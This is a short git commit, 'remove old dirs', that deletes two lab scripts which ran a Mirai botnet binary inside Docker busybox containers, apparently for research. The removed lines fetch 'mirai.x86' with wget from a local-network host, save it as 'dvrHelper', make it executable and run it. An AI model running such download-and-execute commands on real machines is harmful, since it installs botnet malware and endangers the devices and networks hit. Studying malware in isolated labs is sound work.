553dfc72afa0b1c097f71c3cd098dc16402d8ae3
labnet <savyovm@gmail.com>
2020-12-15 12:32:37 -0300

    remove old dirs

--- experiment/script/load_bot.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-docker exec -w / -it bb$1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
--- experiment/script/run_bot.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-docker exec -w / -i bb$1 sh -c "./dvrHelper && sleep 1" &
